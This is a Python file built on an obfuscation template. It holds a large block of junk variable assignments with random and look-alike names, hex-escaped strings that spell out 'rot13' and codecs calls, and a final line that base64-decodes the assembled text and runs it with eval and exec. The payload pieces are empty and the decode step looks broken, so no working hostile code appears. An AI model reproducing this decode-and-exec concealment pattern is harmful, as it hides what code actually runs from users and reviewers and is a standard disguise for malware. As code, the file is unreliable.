import base64, codecs
magic = 'N16364814033050265226 = 337
T16364814033049982224 = 696
E222 = "dGgtcFDzpCoMRGRhNgTaSIOlOwghTFegDKgHqSwrnOLxvMaSdYetIYLFieYmKkNzziyyfDQCSJIbBhz"
A1636481403304636220 = 491
M1636481403304612218 = "CsOnOVkYGyHoYIeAwgeCqNINBPyUlKcoBdXlzqolwALdFqNtJNKpHBjaEJyQhKIuumfBquByPwDPnkT"
Y216 = 223
lsKRbkqyZxQrqgtyXbqwBNDSgIyCvSJwfUsdhGclkCGViKcZSQYKhmlTwciXErJOwbdFcrHzSqxRJQn214 = "WVVQiapTuylFnvolYjXvkcojUlSpgjzQnyiTrMoJrqqnXtLvJiUhRqMyEmBGuHuTtJCffYmZEgNVKjS"
t16364814033041894212 = 585
M16364814033041537210 = 602
IIIlIIllIlIlIllIIlllllllIlIlllIlIllIIllIIllllllIIIIIllIIlllIIIlIlIllllIlIlllIllIlllIlIlIlIlIlllllIlllIIIIIlIIlllllIIlIllIIIIIIIlllIIlIlIIlIlllIIlllIllIllllIlllIlIIIlIllIIIIlIllIlIIllIIlllIlllIlIllIIIlIIllIlII = 220
IIllllIllIIIIlIIIlIIlIIllIIIIIIIlIIlIIIIIIIlIIIlllIllIIlllIIllllIIllIlIllIlIIlIIlIlllIIIIlIIlIlIllIllllIIIIllllIIllIlIlIlIlIIIIIIlIIIllIIIlIIlIIIlIIllIIIIlllIlllIllIIIIlIlllllIIlIlIlllIIIlllIlllIIIlllIlIllI = "pIpozjQYbYPajmDglSupIMGNyhOkZouLXQsgvHWnPAbkJiXgsvTBdkgJwRwEBKppJUmkcmIzRctDnzj"
hIcrqQJJrJPBMVqfigSpPqXRZeQOlxQdZadaRQEDwCSLVzYJrVOMEuQgFgADuWzGkVYfDGMMAakXGbS204 = 312
AAAaAaAaaAAaaAAaAaAaaaaAAAAAAAAAAAaAaaaaAaaaAaaAAaaAaAAaAaAaAaaaaAaAaAaaaaAAaaaaAaAAAaAaAAaaAaaaaaaAAAaAaaaaaaaaAaaaAaaaAAaaaaaAaaaaaaAAAaAaAaAaAaaAAaAaAAAAaaAaAaaAaaAaAaaaAaAaaaaAaaAaaaAaAAaaAaAAAaAaaa = 214
LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL = 149
KLFeaNIOuYdBXQrxOdhnnUWpUGokekEVfstAqFEwjQfodblJIlHcQxksXRiXdGOewRCMTQJXuPeJeFg198 = "ParKpSpDTdZKWYuOVWfRlfammgzykWIGtAEEoVKfhCCuLDWbvKPqeDrdSoOSuBkLpMHZZRJdMWnQyvF"
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = "DpttlwmCCkWSRCtiSfjliQpmCbmjYjecNjMsevsUAUgXxrjApuAwmaSbHpOVtDtivMSRFbxDsyXvquu"
IIllIIlIlIlIIllllIlllIIIIlIIIIIlllIIlIlllIlIIIlIlIIlllIlIIIlIIllIlIlIIlllIIIllllIlIIIIlllllIIIIlIlIlIIlIIlIIIllllIIIlllIllIIlIIlIIllllIllIlIIIlIIlIllIIIlIIIIlIIllIlIllIIIIIlllIIllIIlllIlIIllIIlI = 603
aAaAAaAaaAAaaAaAaaAaAAaaaaAAAaAAAaaaaaAAaAAaAaaaaaaaaaAaAaAaAaAAaAAAAAAAaaAAaAAAaAaAaAAaAaAAaaaaAAAaaaAaAaaaAaAAaAaAaAAaaAAaaaAAaAaAaAaAAaaaaaaaaaAAaAAaAAAAaAAaaaaAAaAaaAaAaAAAaAAAAaAAAAaAaaAA = 142
C16364814033023822190 = "JmKlylIpLfUQBSLiPFoORiRmDvaGJlnESxqOkAtKKGgdmMacXSdYgkBlonyYkvQovcNDRcNFEcOJVUT"
V188 = 226
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH = 375
d16364814033019323184 = "ORFDHduPCXxcGjUywvvCIlncOkXYaBTJzINfXlKRAKPJlguFpREoWLQleXONlHcssLpUjSlRUujcFxl"
v182 = "HwmGWHxoiAQjsHMRyRICofiSdYirKpsPyBRyYvBVaMYCsnjOQbIKeZTmaHhZRWvdBbAkhUAqWaJGyOj"
iRnepaUHrYDVnRlqxHThZnCPOAbIeUhZQOBkgmadFiimWtsHDaZVfcUWmHaWUDkPSQPTQyswAbGyzuC180 = "VgMFrdwpbROmjZRcBpNQcoaewNAAMXAxKMRTxPIGHSAedaLrlXxrWWqPmlxEfgkKcSEFAylwYDaypTZ"
vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv = "YqtCHBflLxBuFdXODhJFLVChZMppdJZfxSyryvoKjHQWDWLKGioFlYWcYCTDMNjKtXjPfQBmfouDODO"
RcTNqaHlCzHjTQYFMhlgsJsGHVuOiGclDzHrwXuCCgSpPeLyusbbDaEIqhdthBcgHKdeAoSAYknLwRV176 = "nbtqWiwiKgkpVImpabZCRLMAbTOdJbhZjEdEIzeytPdffJNgkKrENJaudeRCMzSLGsJWMywGUoYIRTa"
aaAaAAAAAaAAaAAaaAaaAaaaAAaaaAaaAaaAaAAAAAAaaaAaaAaAaAAAaAAaAaaAAaAaAaAAaAAAAAaAAaaaaAaAAAAAaAAaaaAaaAaaAAaAaaaAaAAAAAaaAAAAaaaaaAaaaAAAAAaaAaaaAaAaaaaAAAaAAaaaaAaAAaAAaaAAAa = 474
PWdsdFpzqsGQWSyKRnqBfJKLeWMXCvsYFEVzfGvRgYAptNaNfcWFewasdkaUNkrsaXLTPbtKuxMdjPe172 = "rKrmnTQTEAjnhVBlSrzWuZzVDzzgLPiIpdPITsjyiFrbifunVDimLwZChQEPwqagzcKbUxFWyvmlfPw"
a170 = "xWLadxXlpKImgaNHnKbjOxnwJfjZRqsSHyRelXhiqYqnQYUVxHXzbAsFjueaWiVzmBDRmxwICGKUnnz"
teUBWprEaUkAxFdrfmYnXZNkyDfnrzCgWseRAvHguXNuNZVHFkhvAmaQlqohKxsFbFeJZjDehsdxBxq168 = 602
aAAaaaaaAaAaAAAaaaAAAaaaaaaAAAAAAAAAaaAAAAaAAaaAAAaAAaAaAaaaAAaAAAaaaAaaAAAAaaAAAaaaAAAaaAAAaaaAaAaaaaAaaaAAaAAAaAAaAAAAaAaAaaAaAaAaAaAAAAaaAAAaaaAaaAAaaaaaaaAAaaaaaA = 568
lIllIIIIIllllIIlllIIIlIllllIlIIllllIIlllIIIlllIllIIIlIIIlIlIlIllIIIIIlIIlIIIlIlIlIlllllIIIIllllIIIlllllIllIlIlIIlIlIlIIllllIIIllIIIlllIlllIIIIllIIIllllIlllIlIlIIIlI = "LjwTRcjUVGQAzWUtXacLMUazeUvaNkysaYpLBfrBtloVwKmnTaTaDjsVlNXGsJUqVQqxxDtaDXqaFLC"
AaaAaaaaAAaaAAaAAAAAaAaAaAaaAaaaAAAaaaaAaaAaaaaAAaaAaaAAAaAaaaaaaAAAAaaaAaAaAAAAaaaaaAaaaaAAAAaaAAaAAAAAAaaaAAAAAaaAAaaaAAaaAAAAAAAAAAAaaaAAAaAaAaAaAaaAAAAaAaAAaa = "oXnhnUFVGxZZUDRTUdfNqUNCEtZiMhsKlXCBVxWyEkrtkcxyrMiTQBGmuWetohblvxfRajhZuMtsIVI"
lIlIIllIIlIlIlIlIllIlIlIIIIIIlIIIllllIlllIIIllIIllIIlIlIllllllllIIIIIIlIlIIlllllIllIlIIIIIIIIllllIIllIIIlIllIllIllllllIIIIlIllIIlIlIIlIlIllllIlllIllIIlIIIlIIlIl = "EUskBgfZJgrWfxpJyQMWbbqKphtBlMWYmnXhRaYCfZdYtTUtWwzukAxaOnbqLBcMLhYfLlbtIChvlyH"
aaaAAaaAAAaaAAAAAAaAaAAAAaaaAaaaaAaaaaaAAAAaaAAAAaaaaaaaAaaAAaAAaaaAaAaAAaaaAAAAAaAAaaAAaAAAaAaaaaaAaaAaaaAAAAaAAaaaAAaaaaaaaaAAaAAAaaaAaaaAaaaaAaaaaAaaAaaaaA = "rEmSLpZTpvZLdbSlCCABMVoHQWXQiJVfxjYHkuJPwkyUuxKbEaLxDXzOqIPYcdfAsEHMlVVxLbLoijO"
rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr = "WjSrVPVFZjgeLnCdwCxindGclyBuTuQlXimaWlKbfqokkwSeiNQzfzgWeTlEtUbBNNLMcKYLIDVMQsz"
IIIIIllIlIlIlIIIlIIIlIIIIllllIlIIIlllllIllIIlllIlIllIIlIlIlllIlllllllIIllIIlIIIlIIlllIIIlIlIllIllIlIIlIIIlIIlIllIIlIIlllIlIlIIllIIIIlIlllIlIIIIIllllIIlIII = "xpMlgImwgnYtDdCnoJpLHIjGXuBCqOUmOTdDfScGovBwsmgJjxIhMZMsRKuQEZnmELzpkbJLIzLsFNs"
JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ = 400
lIllIIllIIIlIIIlllllllllIlIlllIlIlIIIIIlIIIIIllIIlIlIIIlIIllllIlIlllIllIIIIllIllIIlIllIlIIlIIIlIIlIIIIlllIIllIlllIlIlllIllIIIIlIllIlIIlllIIlIIIIllllll = 252
Q1636481403298935148 = "NLvPsSxKxwMNqLQwGhcSSTEASUJrCQwwjsPEFeXhTjMvysoklXkwCQtGElJsDkvTQqjyaSXcMDejABA"
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd = "rLlHXAsHATEgYiOjIrtWCRsqBdIdfdwWgPOHybPjyjoBjGUzKtCZxRgFoLZwvSzuWOnorpJqESOpOFo"
pTmZKXjoDmurLIRniyuWOAwNRxYirnkBwFpJgUjTbFbLryQyAGhCQhzOIrsqJoVcGoQKAnJBKoehOBJ144 = 243
AaaaAaAaaaAaAAAAAAaaaAAAAAAaAAAaaaaAAAAAaaaAaaAAaAaaAAaaAAaaAAaaaaaaaaaaaAaaAaaaAaaaAaaaAAaaaAAAAaAAaAAaAAaAAaaaaaaAaaAaaAAAaAAaAAAaAAaAAAAaaA = "wiuILUBRSEmUZtxMyatOnmPPPUbjHgibxiXJEvyGpqfXUmTBdAFyWSOdXrBprJRVvHMWaOkGaeKFBoG"
M140 = "xboXlOJBLFUkSTVfKPkloicdKhnWobfJoSRbyBZQRjekusHNemFNYabwoYdXjdHixdDkgxVXMXeTCkC"
q1636481403298165138 = 528
w136 = "bfBUJbMQDOsprFmCRWUlpfDXlLMhDgIWbUQWlJHbaXPswHFcrWILurAQSkzDZtBDWmeXHHleSTixNqz"
F16364814032980123134 = "UHnvbMvoNvbuHiZUOqEWqHfRvRtKTSNHgbbdUJvoigcGKYSTqmypPYJhHnbtyIWMOmdsJifNAqVCymr"
aaaAaAaAAaaAAAaAAAaAaaaaAaaAAAAAaaAAAaaaAAAAaAaaAaaaAAAAaAaAAaaaAAaaAAaaaAAaaaaaaaAaaAAAaAAAaAaaAaAAaAaAAAaaaAAaaAaaAaaAAaAAAaaAAaaA = 365
v16364814032977624130 = 430
v128 = "YipurEsZxrpfgfGiESmNQnnxQvJNFdbyFIyMrXStyVNpYufuZnCwTkpxIdmAfkefftmDeTRWGPzVRiE"
LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL = 816
aAAaaaAaAaaAaAaAAAaAAaAAaAaAaAaaAAaaAaAAaaAAAaAaaAAAAaaaaAaaAAAaAAAaaaAaAAAAAaAAAAaaaAaAAaAAaAaaaAAaaAaAAAAaAAAaAAaAAAaAaAaA = 254
R16364814032972472122 = 254
N1636481403297133120 = 496
W16364814032969794118 = 532
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb = 242
avvTHYwdpQKCvmfSiDcZrxPDRoCZnthwKAimvRpwjEcbvrzDJYWFqAkFwlmKHuOTtKqvwTcwCMUSkyx114 = "WvFUNNlghEGMHNWiPLuIxypPTBmjxeBgFNKraEUWXJFKymxVUlvUszCEdNnMYeoHEzpPuVzpHaAkmAe"
g16364814032965963112 = "reiANCJeJsxrxXFJLOwyTELqVskkYcgOYPiDBljYYEfkyzKnnLiuOXRxzGsJtyMOZwMqzTNxnMkjJkk"
lIlIIlIIllIlIIlIIlIlllIIIIllIlIIllIIIIIIIlIIlIllIIIllIIIllIlIIIIIlIIIllIIlIIIIIIIllllllIIIllllIlIllIllIIlIlIlI = "JsrgMiLOGroccOnLBEyiiIpMwxCuakCNHvkTbBocAMnPynNDwCbYpLDmxZQaNRlfBFDWuqdQeDtJjzf"
VQHmGSbbLEOGxxXTTTsTwBxwjfXAsEkoNNPZmanUguXVDjjGvqsSTBWqATTPitpgywdzYDtBZVufvos108 = 315
IlIIlIlIlIIIllIIllIIlIllIIlllIIIllIIlIlIlllIIIIllIlllIlIIIIllllllIlllIIlIIIlIlIIlllIlIllllIlIIlIIIllllllll = 310
aaAAAAaAaAaaaaAaaaAaaaAaAAAAaAAAaaAAaaaaaAAaaaAaAAaAaAAaaaaAAAaaaaAAAaaaAAAaAaAaAaaAaAAAAaaAAAaaAAAaaAAa = "TQYjMeeMDtmJlzfAFHryYfTcpHnJeFslAzTfRTJqToppKvTCHxiqCrhkaUeOmJsQboYOQCMhbwYNKez"
H102 = 252
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy = "XynClGkJbkYJcPDSdsQjGEwkDImafWNFoLxVSQfDCJqpcztkmiaWdrPkZGfGdNLnIgqXHimcOAjkzlL"
DBYfkCcaBaveedvPwyuPKbaFCvOwhKCtlMzniPzaKpOSktvPDhimEwnuDDeSHYYiCnhdafAUMQrFUaD98 = "zKaagwkUeMMBbycQbfcUXnCXSLeGGYJRLjtsQvdfBkzEvZdGBzCTgkmHtIzBzMgfASsrDvUHIqikotA"
I163648140329556796 = 222
lIIIIlllIIIllIllIlIIllIIIlIlIllIIllIlIlIIllIIlIllIIIIlIIlIlIlIlIIIlIlllllllIIIIIlIIllIlIIIIIlI = 371
AaAAAAAAaAAaAaaAaAAAAaaAAaaAAAaAAaAaaAaAAAAAAaAaAaAAaAaaAAAAAAaAaAAaAaAAaAAAaaaAaaaAAaAAAAaa = "TFjUOcvSRoOpUBFYdyEgrbXxWjQBTOFBVSxrzDcOgMaBSoQekvrYQUWtyBynZtJONXABUKrXdPhljNi"
AaaaAaaaaaaaAaAaAaaaaaAAaAaaAaAaaAAaaaAaAaAAAAaaaAAaaAAAaaAAAAaaaAaAAAAAaAAAaaAaAAAAAAAAAa = 165
LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL = "qhmdDjHydWOwZblBuMaUUZMecHkOPsSeYJJWeBrvxnkmJgXIXQENzbmKgsJzBRPIUGxvcVvFMTngNhq"
AaAaAAaaAAaaaaAaAAaAaAAaAAaAAAAAaaaaaaaAAAaaaaAaaAAAAaAaaaAaaAAAaaaAaAaAAaAAAAaaAAAaaA = "jDhsGbXUUAohBFUCIRQvwDQYXeteZUkddgIuPMbYvtWJSSuTMVvDddGKFuLRqONPsZpMbsRkwaJrtra"
lllIIIlllllllllIlIlllIIlIlllIIIlIlIlIllIIIllIlIIllIllIlllIIllIIIl'
love = ''
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
